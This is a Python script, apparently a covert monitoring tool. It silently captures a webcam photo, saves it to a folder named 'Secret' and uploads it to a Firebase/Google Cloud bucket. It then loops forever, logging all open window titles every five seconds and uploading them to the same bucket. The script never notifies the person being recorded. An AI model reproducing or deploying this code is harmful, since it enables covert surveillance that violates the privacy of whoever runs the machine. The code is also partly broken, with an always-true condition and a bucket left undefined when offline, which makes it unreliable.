import cv2 as cv2
import socket
from datetime import date
from datetime import datetime
from google.cloud import storage
from firebase import firebase
import os
import time
REMOTE_SERVER = "www.google.com"

def is_connected(hostname):
  try:
    # see if we can resolve the host name -- tells us if there is
    # a DNS listening
    host = socket.gethostbyname(hostname)
    # connect to the host -- tells us if the host is actually
    # reachable
    s = socket.create_connection((host, 80), 2)
    s.close()
    return True
  except:
     pass
  return False

def convert(s): 
  
    # initialization of string to "" 
    new = "" 
  
    # traverse in the string  
    for x in s: 
        new += x  
  
    # return string  
    return new 

f=is_connected(REMOTE_SERVER)



if f== False or True:

  
  dt = datetime.now()
  #datetime.strftime(time)
  
  #print("Today's date:", dt)
  #print('Formatted DateTime', dt.strftime("%m/%d/%y %H:%M:%S"))
  user_name="user"+dt.strftime("%m-%d-%y %H.%M.%S")
  print("user_name=",user_name)
  #print(type(user_name))
  camera = cv2.VideoCapture(0)
  return_value, image = camera.read()
  
  path='D:/downloads/torrent/Secret/'+user_name+'.jpg'
  cv2.imwrite(path,image)
  cv2.destroyAllWindows()
  camera.release()
  
  	

  if f==True:
    
    os.environ["GOOGLE_APPLICATION_CREDENTIALS"]="userdatarecord-91b776c797f3.json"
    firebase = firebase.FirebaseApplication('https://userdatarecord.firebaseio.com/')
    client = storage.Client()
    bucket = client.get_bucket('userdatarecord.appspot.com')
    imagePath = path
    imageBlob = bucket.blob(user_name+".jpg")
    imageBlob.upload_from_filename(imagePath)
    
  while(True):
      import pygetwindow as gw
      k=gw.getAllTitles()
      s=convert(k)
      f=open(user_name+"details.txt","w+")
      f.write(s)
      time.sleep(5)
      blob2 = bucket.blob(user_name+'details.txt')
      outfile=user_name+"details.txt"
      blob2.upload_from_filename(outfile)







  
